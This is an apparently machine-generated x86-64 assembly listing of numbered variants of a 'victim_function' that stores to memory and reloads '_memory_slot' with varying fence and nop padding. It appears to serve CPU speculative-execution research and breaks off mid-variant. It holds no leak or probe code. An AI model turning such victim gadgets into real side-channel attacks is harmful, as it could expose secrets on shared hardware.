## Variant 1798
.Lvictim_function_win0_var1798:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1799
.Lvictim_function_win0_var1799:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1800
.Lvictim_function_win0_var1800:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1801
.Lvictim_function_win0_var1801:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1802
.Lvictim_function_win0_var1802:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1803
.Lvictim_function_win0_var1803:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1804
.Lvictim_function_win0_var1804:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1805
.Lvictim_function_win0_var1805:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1806
.Lvictim_function_win0_var1806:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1807
.Lvictim_function_win0_var1807:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1808
.Lvictim_function_win0_var1808:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1809
.Lvictim_function_win0_var1809:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1810
.Lvictim_function_win0_var1810:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1811
.Lvictim_function_win0_var1811:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1812
.Lvictim_function_win0_var1812:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1813
.Lvictim_function_win0_var1813:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1814
.Lvictim_function_win0_var1814:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1815
.Lvictim_function_win0_var1815:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1816
.Lvictim_function_win0_var1816:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1817
.Lvictim_function_win0_var1817:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1818
.Lvictim_function_win0_var1818:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1819
.Lvictim_function_win0_var1819:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1820
.Lvictim_function_win0_var1820:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1821
.Lvictim_function_win0_var1821:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1822
.Lvictim_function_win0_var1822:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1823
.Lvictim_function_win0_var1823:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1824
.Lvictim_function_win0_var1824:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1825
.Lvictim_function_win0_var1825:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1826
.Lvictim_function_win0_var1826:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1827
.Lvictim_function_win0_var1827:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1828
.Lvictim_function_win0_var1828:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1829
.Lvictim_function_win0_var1829:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1830
.Lvictim_function_win0_var1830:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1831
.Lvictim_function_win0_var1831:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1832
.Lvictim_function_win0_var1832:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1833
.Lvictim_function_win0_var1833:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1834
.Lvictim_function_win0_var1834:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1835
.Lvictim_function_win0_var1835:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1836
.Lvictim_function_win0_var1836:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1837
.Lvictim_function_win0_var1837:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1838
.Lvictim_function_win0_var1838:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1839
.Lvictim_function_win0_var1839:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1840
.Lvictim_function_win0_var1840:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1841
.Lvictim_function_win0_var1841:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1842
.Lvictim_function_win0_var1842:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1843
.Lvictim_function_win0_var1843:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1844
.Lvictim_function_win0_var1844:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1845
.Lvictim_function_win0_var1845:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1846
.Lvictim_function_win0_var1846:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1847
.Lvictim_function_win0_var1847:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1848
.Lvictim_function_win0_var1848:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1849
.Lvictim_function_win0_var1849:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1850
.Lvictim_function_win0_var1850:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1851
.Lvictim_function_win0_var1851:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1852
.Lvictim_function_win0_var1852:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1853
.Lvictim_function_win0_var1853:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1854
.Lvictim_function_win0_var1854:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1855
.Lvictim_function_win0_var1855:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1856
.Lvictim_function_win0_var1856:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1857
.Lvictim_function_win0_var1857:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1858
.Lvictim_function_win0_var1858:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1859
.Lvictim_function_win0_var1859:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1860
.Lvictim_function_win0_var1860:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1861
.Lvictim_function_win0_var1861:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1862
.Lvictim_function_win0_var1862:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1863
.Lvictim_function_win0_var1863:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1864
.Lvictim_function_win0_var1864:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1865
.Lvictim_function_win0_var1865:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1866
.Lvictim_function_win0_var1866:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1867
.Lvictim_function_win0_var1867:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1868
.Lvictim_function_win0_var1868:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1869
.Lvictim_function_win0_var1869:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1870
.Lvictim_function_win0_var1870:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1871
.Lvictim_function_win0_var1871:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1872
.Lvictim_function_win0_var1872:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1873
.Lvictim_function_win0_var1873:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1874
.Lvictim_function_win0_var1874:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1875
.Lvictim_function_win0_var1875:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1876
.Lvictim_function_win0_var1876:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1877
.Lvictim_function_win0_var1877:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1878
.Lvictim_function_win0_var1878:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1879
.Lvictim_function_win0_var1879:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1880
.Lvictim_function_win0_var1880:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1881
.Lvictim_function_win0_var1881:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1882
.Lvictim_function_win0_var1882:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1883
.Lvictim_function_win0_var1883:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1884
.Lvictim_function_win0_var1884:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1885
.Lvictim_function_win0_var1885:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1886
.Lvictim_function_win0_var1886:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1887
.Lvictim_function_win0_var1887:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1888
.Lvictim_function_win0_var1888:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1889
.Lvictim_function_win0_var1889:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1890
.Lvictim_function_win0_var1890:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1891
.Lvictim_function_win0_var1891:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1892
.Lvictim_function_win0_var1892:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1893
.Lvictim_function_win0_var1893:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1894
.Lvictim_function_win0_var1894:
	popq	%rax
